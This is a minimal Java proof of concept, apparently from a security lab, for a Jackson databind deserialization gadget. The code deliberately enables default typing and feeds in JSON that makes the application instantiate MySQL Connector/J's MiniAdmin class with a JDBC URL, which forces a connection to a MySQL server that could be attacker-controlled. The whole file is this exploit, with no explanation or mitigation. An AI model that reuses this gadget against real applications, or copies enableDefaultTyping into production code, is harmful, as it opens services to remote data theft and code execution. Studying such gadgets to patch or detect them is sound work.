package cn.hungslabsec;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.sql.SQLException;

public class Main {
    public static void main(String[] args) throws SQLException, IOException {
        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();

        String json = "[\"com.mysql.cj.jdbc.admin.MiniAdmin\", \"jdbc:mysql://127.0.0.1:3306/\"]";

        mapper.readValue(json, Object.class);

    }
}